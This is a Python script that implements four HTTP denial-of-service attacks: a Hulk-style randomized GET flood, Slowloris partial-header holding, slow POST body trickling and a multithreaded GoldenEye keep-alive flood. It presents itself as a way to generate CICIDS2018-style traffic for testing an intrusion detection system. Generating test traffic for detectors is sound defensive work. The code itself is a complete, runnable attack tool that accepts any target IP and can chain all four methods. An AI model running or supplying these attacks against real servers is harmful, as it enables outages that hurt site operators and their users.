#!/usr/bin/env python
"""
DoS Attack - HTTP Application Layer (CICIDS2018 methodology)
Simulates Hulk, Slowloris, GoldenEye, and SlowHTTPTest style attacks.
These are the EXACT tools used in CICIDS2018 dataset creation.

Should be detected as 'DoS' by your NIDS.
"""

import sys
import time
import socket
import random
import string
import threading

# ======================================================================
# Hulk-style: Rapid HTTP GET flood with randomized parameters
# CICIDS2018 used Hulk on Feb 16 (13:45-14:19)
# ======================================================================
def hulk_attack(target_ip, target_port=80, duration=120):
    """
    Hulk (Http Unbearable Load King) style attack.
    Sends rapid randomized HTTP GET requests to overwhelm the web server.
    Each request has unique URL parameters to bypass caching.
    Creates FULL TCP connections (3-way handshake) -> HTTP request -> server response.
    This generates proper bidirectional flows for CICFlowMeter.
    """
    print(f"\n{'='*60}")
    print(f"DoS Attack - Hulk Style (HTTP GET Flood)")
    print(f"{'='*60}")
    print(f"Target: http://{target_ip}:{target_port}")
    print(f"Duration: {duration} seconds")
    print(f"\n[!] Starting Hulk-style DoS... (Your NIDS should show 'DoS')")
    print(f"{'='*60}\n")

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1",
        "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    ]

    referers = [
        "http://www.google.com/?q=",
        "http://www.bing.com/search?q=",
        "http://search.yahoo.com/search?p=",
        "http://www.ask.com/web?q=",
        "http://duckduckgo.com/?q=",
    ]

    paths = ["/", "/index.html", "/login", "/search", "/api", "/page", "/data"]

    start_time = time.time()
    request_count = 0
    success_count = 0

    try:
        while time.time() - start_time < duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((target_ip, target_port))

                # Random path with random query params (bypasses caching like Hulk)
                path = random.choice(paths)
                param = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 12)))
                value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 20)))
                url = f"{path}?{param}={value}&{''.join(random.choices(string.digits, k=8))}"

                ua = random.choice(user_agents)
                ref = random.choice(referers) + ''.join(random.choices(string.ascii_lowercase, k=6))

                request = (
                    f"GET {url} HTTP/1.1\r\n"
                    f"Host: {target_ip}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                    f"Accept-Encoding: gzip, deflate\r\n"
                    f"Referer: {ref}\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                )

                s.sendall(request.encode())

                # Read response (creates backward flow for CICFlowMeter)
                try:
                    response = s.recv(4096)
                    success_count += 1
                except:
                    pass

                s.close()
                request_count += 1

                if request_count % 50 == 0:
                    elapsed = time.time() - start_time
                    rate = request_count / elapsed if elapsed > 0 else 0
                    print(f"[+] Sent {request_count} HTTP requests ({rate:.0f} req/s) | {success_count} responses...")

            except socket.timeout:
                request_count += 1
            except ConnectionRefusedError:
                request_count += 1
                time.sleep(0.1)
            except Exception:
                request_count += 1

    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    finally:
        elapsed = time.time() - start_time
        rate = request_count / elapsed if elapsed > 0 else 0
        print(f"\n{'='*60}")
        print(f"[+] Hulk DoS complete!")
        print(f"    Requests sent: {request_count}")
        print(f"    Responses received: {success_count}")
        print(f"    Time elapsed: {elapsed:.1f}s")
        print(f"    Average rate: {rate:.0f} req/s")
        print(f"{'='*60}\n")


# ======================================================================
# Slowloris-style: Hold connections open with partial headers
# CICIDS2018 used Slowloris on Feb 15 (10:59-11:40)
# ======================================================================
def slowloris_attack(target_ip, target_port=80, duration=120, socket_count=150):
    """
    Slowloris style attack.
    Opens many connections and keeps them alive by sending partial HTTP headers.
    Each connection sends a valid but INCOMPLETE request, then periodically
    sends another header line to prevent timeout. Exhausts server connection pool.
    """
    print(f"\n{'='*60}")
    print(f"DoS Attack - Slowloris Style (Slow Headers)")
    print(f"{'='*60}")
    print(f"Target: http://{target_ip}:{target_port}")
    print(f"Duration: {duration} seconds")
    print(f"Max connections: {socket_count}")
    print(f"\n[!] Starting Slowloris DoS... (Your NIDS should show 'DoS')")
    print(f"{'='*60}\n")

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1",
    ]

    sockets_list = []

    def create_socket():
        """Create a new socket and send partial HTTP header"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            ua = random.choice(user_agents)
            s.send(f"GET /?{''.join(random.choices(string.digits, k=8))} HTTP/1.1\r\n".encode())
            s.send(f"Host: {target_ip}\r\n".encode())
            s.send(f"User-Agent: {ua}\r\n".encode())
            s.send("Accept-Language: en-US,en;q=0.5\r\n".encode())
            return s
        except Exception:
            return None

    start_time = time.time()
    keep_alive_count = 0

    try:
        print(f"[*] Opening {socket_count} connections...")
        for _ in range(socket_count):
            s = create_socket()
            if s:
                sockets_list.append(s)
        print(f"[+] {len(sockets_list)} connections established\n")

        while time.time() - start_time < duration:
            for s in list(sockets_list):
                try:
                    header_name = ''.join(random.choices(string.ascii_letters, k=random.randint(5, 10)))
                    header_val = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(3, 12)))
                    s.send(f"X-{header_name}: {header_val}\r\n".encode())
                    keep_alive_count += 1
                except Exception:
                    sockets_list.remove(s)
                    new_s = create_socket()
                    if new_s:
                        sockets_list.append(new_s)

            elapsed = time.time() - start_time
            print(f"[+] Active: {len(sockets_list)} connections | Keep-alives: {keep_alive_count} | {elapsed:.0f}s elapsed")
            time.sleep(15)

    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    finally:
        for s in sockets_list:
            try:
                s.close()
            except:
                pass
        elapsed = time.time() - start_time
        print(f"\n{'='*60}")
        print(f"[+] Slowloris DoS complete!")
        print(f"    Peak connections: {socket_count}")
        print(f"    Keep-alive headers sent: {keep_alive_count}")
        print(f"    Time elapsed: {elapsed:.1f}s")
        print(f"{'='*60}\n")


# ======================================================================
# SlowHTTPTest-style: Slow POST body
# CICIDS2018 used SlowHTTPTest on Feb 16 (10:12-11:08)
# ======================================================================
def slow_post_attack(target_ip, target_port=80, duration=120, socket_count=100):
    """
    SlowHTTPTest style attack.
    Opens HTTP POST connections and sends the body very slowly (1 byte at a time).
    Server waits for the full Content-Length but it never arrives.
    """
    print(f"\n{'='*60}")
    print(f"DoS Attack - SlowHTTPTest Style (Slow POST Body)")
    print(f"{'='*60}")
    print(f"Target: http://{target_ip}:{target_port}")
    print(f"Duration: {duration} seconds")
    print(f"Max connections: {socket_count}")
    print(f"\n[!] Starting Slow POST DoS... (Your NIDS should show 'DoS')")
    print(f"{'='*60}\n")

    sockets_list = []

    def create_post_socket():
        """Create a socket and send POST header with large Content-Length"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            content_length = random.randint(100000, 1000000)
            request = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {target_ip}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {content_length}\r\n"
                f"Accept: */*\r\n"
                f"\r\n"
            )
            s.send(request.encode())
            return s
        except Exception:
            return None

    start_time = time.time()
    bytes_sent = 0

    try:
        print(f"[*] Opening {socket_count} POST connections...")
        for _ in range(socket_count):
            s = create_post_socket()
            if s:
                sockets_list.append(s)
        print(f"[+] {len(sockets_list)} connections established\n")

        while time.time() - start_time < duration:
            for s in list(sockets_list):
                try:
                    byte_data = random.choice(string.ascii_letters).encode()
                    s.send(byte_data)
                    bytes_sent += 1
                except Exception:
                    sockets_list.remove(s)
                    new_s = create_post_socket()
                    if new_s:
                        sockets_list.append(new_s)

            elapsed = time.time() - start_time
            print(f"[+] Active: {len(sockets_list)} connections | Bytes trickled: {bytes_sent} | {elapsed:.0f}s elapsed")
            time.sleep(10)

    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    finally:
        for s in sockets_list:
            try:
                s.close()
            except:
                pass
        elapsed = time.time() - start_time
        print(f"\n{'='*60}")
        print(f"[+] Slow POST DoS complete!")
        print(f"    Peak connections: {socket_count}")
        print(f"    Bytes trickled: {bytes_sent}")
        print(f"    Time elapsed: {elapsed:.1f}s")
        print(f"{'='*60}\n")


# ======================================================================
# GoldenEye-style: HTTP Keep-Alive with random User-Agents
# CICIDS2018 used GoldenEye on Feb 15 (9:26-10:09)
# ======================================================================
def goldeneye_attack(target_ip, target_port=80, duration=120, threads=10):
    """
    GoldenEye style attack.
    Uses HTTP Keep-Alive connections and sends many requests per connection.
    Multiple threads simulate concurrent users overwhelming the server.
    """
    print(f"\n{'='*60}")
    print(f"DoS Attack - GoldenEye Style (HTTP Keep-Alive Flood)")
    print(f"{'='*60}")
    print(f"Target: http://{target_ip}:{target_port}")
    print(f"Duration: {duration} seconds")
    print(f"Threads: {threads}")
    print(f"\n[!] Starting GoldenEye DoS... (Your NIDS should show 'DoS')")
    print(f"{'='*60}\n")

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    ]

    counters = {"requests": 0, "responses": 0}
    lock = threading.Lock()
    stop_event = threading.Event()

    def worker():
        """Single worker thread sending keep-alive requests"""
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((target_ip, target_port))

                for _ in range(random.randint(5, 30)):
                    if stop_event.is_set():
                        break

                    param = ''.join(random.choices(string.ascii_lowercase, k=8))
                    ua = random.choice(user_agents)
                    request = (
                        f"GET /?{param}={''.join(random.choices(string.digits, k=10))} HTTP/1.1\r\n"
                        f"Host: {target_ip}\r\n"
                        f"User-Agent: {ua}\r\n"
                        f"Accept: */*\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n"
                    )
                    s.sendall(request.encode())

                    with lock:
                        counters["requests"] += 1

                    try:
                        resp = s.recv(4096)
                        if resp:
                            with lock:
                                counters["responses"] += 1
                    except:
                        pass

                    time.sleep(random.uniform(0.01, 0.1))

                s.close()
            except Exception:
                pass
            time.sleep(random.uniform(0.01, 0.5))

    start_time = time.time()

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        thread_list.append(t)

    try:
        while time.time() - start_time < duration:
            time.sleep(5)
            elapsed = time.time() - start_time
            with lock:
                req = counters["requests"]
                resp = counters["responses"]
            rate = req / elapsed if elapsed > 0 else 0
            print(f"[+] Requests: {req} | Responses: {resp} | {rate:.0f} req/s | {elapsed:.0f}s elapsed")

    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    finally:
        stop_event.set()
        for t in thread_list:
            t.join(timeout=3)
        elapsed = time.time() - start_time
        print(f"\n{'='*60}")
        print(f"[+] GoldenEye DoS complete!")
        print(f"    Requests sent: {counters['requests']}")
        print(f"    Responses received: {counters['responses']}")
        print(f"    Time elapsed: {elapsed:.1f}s")
        print(f"    Threads used: {threads}")
        print(f"{'='*60}\n")


# ======================================================================
# Main
# ======================================================================
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python 1_dos_attack.py <TARGET_IP> [OPTIONS]")
        print()
        print("Modes (matching CICIDS2018 tools):")
        print("  --hulk           Hulk-style HTTP GET flood (default)")
        print("  --slowloris      Slowloris-style slow headers")
        print("  --slowpost       SlowHTTPTest-style slow POST body")
        print("  --goldeneye      GoldenEye-style HTTP keep-alive")
        print("  --all-dos        Run all 4 DoS methods sequentially")
        print()
        print("Options:")
        print("  --port <PORT>       Target port (default: 80)")
        print("  --duration <SEC>    Duration in seconds (default: 120)")
        print("  --threads <N>       Threads for GoldenEye (default: 10)")
        print()
        print("Examples:")
        print("  python 1_dos_attack.py 192.168.56.102")
        print("  python 1_dos_attack.py 192.168.56.102 --slowloris --duration 300")
        print("  python 1_dos_attack.py 192.168.56.102 --all-dos --duration 60")
        sys.exit(1)

    target_ip = sys.argv[1]
    port = 80
    duration = 120
    mode = "hulk"
    threads = 10

    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == "--port" and i + 1 < len(sys.argv):
            port = int(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == "--duration" and i + 1 < len(sys.argv):
            duration = int(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == "--threads" and i + 1 < len(sys.argv):
            threads = int(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == "--hulk":
            mode = "hulk"
            i += 1
        elif sys.argv[i] == "--slowloris":
            mode = "slowloris"
            i += 1
        elif sys.argv[i] == "--slowpost":
            mode = "slowpost"
            i += 1
        elif sys.argv[i] == "--goldeneye":
            mode = "goldeneye"
            i += 1
        elif sys.argv[i] == "--all-dos":
            mode = "all"
            i += 1
        else:
            i += 1

    if mode == "all":
        per_attack = max(duration // 4, 15)
        print(f"\n[*] Running all 4 DoS methods, {per_attack}s each ({duration}s total)\n")
        hulk_attack(target_ip, port, per_attack)
        time.sleep(2)
        goldeneye_attack(target_ip, port, per_attack, threads)
        time.sleep(2)
        slowloris_attack(target_ip, port, per_attack)
        time.sleep(2)
        slow_post_attack(target_ip, port, per_attack)
    elif mode == "slowloris":
        slowloris_attack(target_ip, port, duration)
    elif mode == "slowpost":
        slow_post_attack(target_ip, port, duration)
    elif mode == "goldeneye":
        goldeneye_attack(target_ip, port, duration, threads)
    else:
        hulk_attack(target_ip, port, duration)
